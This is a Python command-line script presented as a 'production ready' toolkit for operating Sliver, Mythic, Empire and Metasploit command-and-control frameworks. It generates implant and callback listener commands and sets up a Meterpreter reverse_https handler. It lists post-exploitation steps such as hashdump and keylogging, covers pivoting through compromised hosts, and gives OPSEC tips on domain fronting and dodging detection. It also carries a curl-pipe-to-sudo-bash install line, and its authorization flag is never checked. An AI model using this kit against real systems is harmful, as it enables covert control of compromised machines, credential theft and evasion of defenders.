#!/usr/bin/env python3
"""
C2 Framework Integration - Production Ready
Sliver, Mythic C2, Empire integration and management
"""

import argparse
import logging
import subprocess
import json
import os
import sys
from pathlib import Path
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class C2Integration:
    """Production-ready C2 framework integration"""
    
    def __init__(self, framework='sliver'):
        self.framework = framework.lower()
        self.supported_frameworks = ['sliver', 'mythic', 'empire', 'metasploit']
        
    def check_sliver(self):
        """Check if Sliver is installed"""
        try:
            result = subprocess.run(['sliver-client', 'version'], 
                                  capture_output=True, text=True, timeout=5)
            logger.info(f"Sliver client installed: {result.stdout.strip()}")
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.warning("Sliver not installed. Install: curl https://sliver.sh/install | sudo bash")
            return False
    
    def sliver_generate_implant(self, os_type='windows', arch='amd64', 
                               lhost=None, lport=443, output='/tmp/implant.exe',
                               protocol='https'):
        """Generate Sliver implant"""
        logger.info(f"Generating Sliver {os_type} implant...")
        
        protocols = {
            'https': f'--http {lhost}:{lport}',
            'mtls': f'--mtls {lhost}:{lport}',
            'dns': f'--dns {lhost}',
            'wg': '--wg'
        }
        
        proto_flag = protocols.get(protocol, f'--http {lhost}:{lport}')
        
        cmd = f"sliver-client generate --os {os_type} --arch {arch} {proto_flag} --save {output}"
        
        logger.info(f"Command: {cmd}")
        logger.info("Sliver implant features:")
        logger.info("  • Cross-platform (Windows, Linux, macOS)")
        logger.info("  • Multiple C2 protocols (HTTPS, mTLS, WireGuard, DNS)")
        logger.info("  • SOCKS5 proxy support")
        logger.info("  • Port forwarding")
        logger.info("  • Process injection")
        logger.info("  • Beacon object files (BOF) support")
        
        return {
            'command': cmd,
            'output': output,
            'protocol': protocol,
            'os': os_type
        }
    
    def sliver_start_listener(self, protocol='https', lhost='0.0.0.0', lport=443):
        """Start Sliver listener"""
        logger.info(f"Starting Sliver {protocol} listener on {lhost}:{lport}")
        
        listeners = {
            'https': f'sliver-server https --lhost {lhost} --lport {lport}',
            'mtls': f'sliver-server mtls --lhost {lhost} --lport {lport}',
            'dns': f'sliver-server dns --domains example.com --lhost {lhost}',
            'wg': 'sliver-server wg --lport 51820'
        }
        
        cmd = listeners.get(protocol)
        
        logger.info(f"Listener command: {cmd}")
        logger.info("Start listener manually or integrate into automation")
        
        return cmd
    
    def sliver_socks_proxy(self, session_id=None):
        """Configure SOCKS5 proxy through Sliver"""
        logger.info("Setting up SOCKS5 proxy for pivoting...")
        
        cmd = "sliver-client use <SESSION_ID>; socks5 start --bind 127.0.0.1:1080"
        
        logger.info("SOCKS5 Proxy Setup:")
        logger.info("  1. Get active session: sliver > sessions")
        logger.info("  2. Use session: sliver > use <SESSION_ID>")
        logger.info("  3. Start SOCKS5: sliver > socks5 start --bind 127.0.0.1:1080")
        logger.info("  4. Configure tools to use proxy: 127.0.0.1:1080")
        logger.info("  5. Example: proxychains nmap -sT 192.168.10.0/24")
        
        return {
            'proxy_host': '127.0.0.1',
            'proxy_port': 1080,
            'usage': 'proxychains <tool> <args>'
        }
    
    def sliver_port_forward(self, remote_host, remote_port, local_port):
        """Configure port forwarding through Sliver"""
        logger.info(f"Port forwarding: localhost:{local_port} -> {remote_host}:{remote_port}")
        
        cmd = f"portfwd add --remote {remote_host}:{remote_port} --bind 127.0.0.1:{local_port}"
        
        logger.info(f"Sliver command: {cmd}")
        logger.info(f"Access internal service at: localhost:{local_port}")
        
        return {
            'local': f'127.0.0.1:{local_port}',
            'remote': f'{remote_host}:{remote_port}',
            'command': cmd
        }
    
    def mythic_setup_guide(self):
        """Mythic C2 setup guide"""
        logger.info("Mythic C2 Framework Setup Guide")
        
        setup_steps = """
        # Mythic C2 Installation (Production)
        
        1. Install Mythic:
           git clone https://github.com/its-a-feature/Mythic
           cd Mythic
           sudo make
           sudo ./mythic-cli start
        
        2. Access Web UI:
           URL: https://127.0.0.1:7443
           Username: mythic_admin
           Password: (check .env file)
        
        3. Install Agents:
           sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
           sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon
           sudo ./mythic-cli install github https://github.com/MythicAgents/freyja
        
        4. Install C2 Profiles:
           sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
           sudo ./mythic-cli install github https://github.com/MythicC2Profiles/websocket
           sudo ./mythic-cli install github https://github.com/MythicC2Profiles/dns
        
        5. Key Features:
           • Multi-operator collaborative interface
           • Docker-based isolation
           • P2P beacon chaining (SMB, TCP)
           • MITRE ATT&CK mapping
           • Modular agent/C2 architecture
        
        6. Pivoting with Mythic:
           - Deploy HTTP beacon to DMZ
           - Deploy P2P beacon (SMB/TCP) to internal network
           - Link internal beacon to DMZ beacon
           - Command: link (select relay host)
        """
        
        print(setup_steps)
        
        return {
            'url': 'https://127.0.0.1:7443',
            'documentation': 'https://docs.mythic-c2.net',
            'github': 'https://github.com/its-a-feature/Mythic'
        }
    
    def empire_setup_guide(self):
        """Empire/Starkiller setup guide"""
        logger.info("Empire/Starkiller C2 Framework Setup Guide")
        
        setup_steps = """
        # Empire/Starkiller Installation (Production)
        
        1. Install Empire:
           git clone https://github.com/BC-SECURITY/Empire.git
           cd Empire
           sudo ./setup/install.sh
           sudo ./empire --rest
        
        2. Install Starkiller (GUI):
           Download from: https://github.com/BC-SECURITY/Starkiller/releases
           Or: sudo ./setup/install.sh --starkiller
        
        3. Start Empire Server:
           sudo ./empire --rest --username admin --password password123
        
        4. Start Starkiller Client:
           ./starkiller-1.x.x.AppImage
           Connect to: https://localhost:1337
        
        5. Key Features:
           • PowerShell, Python3, C# agents
           • Starkiller GUI for easy management
           • Integrated obfuscation
           • Encrypted communications
           • Large module library (Mimikatz, Rubeus, etc.)
        
        6. Generate Stager:
           Empire > listeners
           Empire > usestager multi/launcher
           Empire > set Listener http
           Empire > execute
        """
        
        print(setup_steps)
        
        return {
            'server_url': 'https://localhost:1337',
            'documentation': 'https://bc-security.gitbook.io/empire-wiki/',
            'github': 'https://github.com/BC-SECURITY/Empire'
        }
    
    def metasploit_integration(self):
        """Metasploit Framework integration"""
        logger.info("Metasploit Framework Integration")
        
        try:
            result = subprocess.run(['msfconsole', '--version'], 
                                  capture_output=True, text=True, timeout=5)
            logger.info(f"Metasploit installed: {result.stdout.strip()}")
            
            msf_guide = """
            # Metasploit Multi-Handler for C2
            
            1. Start msfconsole:
               msfconsole
            
            2. Setup multi/handler:
               use exploit/multi/handler
               set payload windows/x64/meterpreter/reverse_https
               set LHOST 0.0.0.0
               set LPORT 443
               set ExitOnSession false
               exploit -j
            
            3. Advanced Payloads:
               • windows/x64/meterpreter/reverse_https
               • linux/x64/meterpreter/reverse_tcp
               • osx/x64/meterpreter/reverse_tcp
               • android/meterpreter/reverse_tcp
            
            4. Post-Exploitation:
               • hashdump
               • screenshot
               • keyscan_start
               • portfwd add -l 3389 -p 3389 -r <target>
               • run autoroute -s 192.168.10.0/24
            """
            
            print(msf_guide)
            
            return True
            
        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.warning("Metasploit not installed")
            logger.info("Install: https://www.metasploit.com/download")
            return False
    
    def c2_infrastructure_guide(self):
        """C2 infrastructure setup best practices"""
        logger.info("Production C2 Infrastructure Best Practices")
        
        guide = """
        # Production C2 Infrastructure Setup
        
        ## Layered Architecture
        
        [Compromised Host] 
            ↓ (pivot/link)
        [Egress Implant] 
            ↓ (HTTPS/DNS)
        [NGINX/Cloudflare Proxy] 
            ↓
        [C2 Server]
        
        ## Setup Steps
        
        1. C2 Server (VPS/Cloud):
           • Ubuntu 20.04+ / Debian
           • Minimum 2 CPU, 4GB RAM
           • 64GB storage
           • Firewall configured
        
        2. Domain Setup:
           • Register domain (Namecheap, Cloudflare)
           • Configure DNS A records
           • Enable Cloudflare proxy (optional)
        
        3. TLS/SSL Certificates:
           • Let's Encrypt: certbot --nginx -d c2.example.com
           • Or self-signed for testing
        
        4. NGINX Reverse Proxy:
           server {
               listen 443 ssl;
               server_name c2.example.com;
               
               ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
               ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
               
               location / {
                   proxy_pass https://127.0.0.1:8443;
                   proxy_set_header Host $host;
                   proxy_set_header X-Real-IP $remote_addr;
               }
           }
        
        5. Firewall Rules:
           # Allow only from proxy
           sudo iptables -A INPUT -p tcp -s <PROXY_IP> --dport 8443 -j ACCEPT
           sudo iptables -A INPUT -p tcp --dport 8443 -j DROP
           
           # Save rules
           sudo iptables-save > /etc/iptables/rules.v4
        
        6. OPSEC Considerations:
           • Use HTTPS (never cleartext HTTP)
           • Customize HTTP headers/URIs
           • Domain fronting (Cloudflare)
           • Rotate infrastructure regularly
           • Avoid default configurations
           • Monitor for detection (VirusTotal, etc.)
        
        7. Monitoring:
           • tail -f /var/log/nginx/access.log
           • Watch for suspicious patterns
           • Blue team detection signatures
        """
        
        print(guide)
        
        return {
            'proxy': 'NGINX',
            'ssl': 'Let\'s Encrypt',
            'cdn': 'Cloudflare (optional)',
            'os': 'Ubuntu 20.04+'
        }
    
    def generate_c2_report(self):
        """Generate C2 integration report"""
        report = {
            'framework': self.framework,
            'supported_frameworks': self.supported_frameworks,
            'capabilities': {
                'sliver': {
                    'implant_generation': True,
                    'socks_proxy': True,
                    'port_forwarding': True,
                    'platforms': ['Windows', 'Linux', 'macOS'],
                    'protocols': ['HTTPS', 'mTLS', 'WireGuard', 'DNS']
                },
                'mythic': {
                    'multi_operator': True,
                    'p2p_beacons': True,
                    'docker_based': True,
                    'mitre_attack': True,
                    'agents': ['Apollo', 'Poseidon', 'Freyja']
                },
                'empire': {
                    'starkiller_gui': True,
                    'languages': ['PowerShell', 'Python3', 'C#'],
                    'obfuscation': True,
                    'encrypted_comms': True
                },
                'metasploit': {
                    'meterpreter': True,
                    'exploit_library': 'Extensive',
                    'post_exploitation': True
                }
            },
            'infrastructure': {
                'proxy': 'NGINX',
                'ssl': 'Let\'s Encrypt',
                'firewall': 'iptables',
                'cdn': 'Cloudflare (optional)'
            }
        }
        
        report_file = 'c2_integration_report.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"C2 integration report saved to {report_file}")
        return report_file


def main():
    parser = argparse.ArgumentParser(description='C2 Framework Integration Toolkit')
    parser.add_argument('--framework', choices=['sliver', 'mythic', 'empire', 'metasploit'], 
                       default='sliver', help='C2 framework to use')
    parser.add_argument('--check-sliver', action='store_true', help='Check Sliver installation')
    parser.add_argument('--sliver-implant', action='store_true', help='Generate Sliver implant guide')
    parser.add_argument('--sliver-listener', action='store_true', help='Sliver listener guide')
    parser.add_argument('--socks-proxy', action='store_true', help='SOCKS5 proxy setup')
    parser.add_argument('--port-forward', nargs=3, metavar=('REMOTE_HOST', 'REMOTE_PORT', 'LOCAL_PORT'),
                       help='Port forwarding setup')
    parser.add_argument('--mythic-setup', action='store_true', help='Mythic C2 setup guide')
    parser.add_argument('--empire-setup', action='store_true', help='Empire/Starkiller setup guide')
    parser.add_argument('--msf-integration', action='store_true', help='Metasploit integration')
    parser.add_argument('--infrastructure', action='store_true', help='C2 infrastructure best practices')
    parser.add_argument('--report', action='store_true', help='Generate C2 integration report')
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    c2 = C2Integration(framework=args.framework)
    
    print("=" * 70)
    print(f"C2 FRAMEWORK INTEGRATION - {args.framework.upper()}")
    print("=" * 70)
    print("\nSupported Frameworks:")
    print("• Sliver - Cross-platform, multi-protocol C2")
    print("• Mythic - Modular, collaborative red team platform")
    print("• Empire/Starkiller - PowerShell/Python/C# C2")
    print("• Metasploit - Classic exploitation framework")
    print("\nFeatures:")
    print("• Implant generation & deployment")
    print("• SOCKS5 proxy for pivoting")
    print("• Port forwarding")
    print("• Multi-operator support")
    print("• Encrypted communications")
    print("=" * 70)
    
    if args.check_sliver:
        c2.check_sliver()
    
    if args.sliver_implant:
        result = c2.sliver_generate_implant(lhost='10.0.0.1')
        print(f"\nSliver implant: {json.dumps(result, indent=2)}")
    
    if args.sliver_listener:
        cmd = c2.sliver_start_listener()
        print(f"\nListener command: {cmd}")
    
    if args.socks_proxy:
        proxy = c2.sliver_socks_proxy()
        print(f"\nSOCKS5 proxy: {json.dumps(proxy, indent=2)}")
    
    if args.port_forward:
        remote_host, remote_port, local_port = args.port_forward
        result = c2.sliver_port_forward(remote_host, int(remote_port), int(local_port))
        print(f"\nPort forwarding: {json.dumps(result, indent=2)}")
    
    if args.mythic_setup:
        c2.mythic_setup_guide()
    
    if args.empire_setup:
        c2.empire_setup_guide()
    
    if args.msf_integration:
        c2.metasploit_integration()
    
    if args.infrastructure:
        c2.c2_infrastructure_guide()
    
    if args.report:
        c2.generate_c2_report()
    
    if len(sys.argv) == 1:
        parser.print_help()


if __name__ == '__main__':
    main()
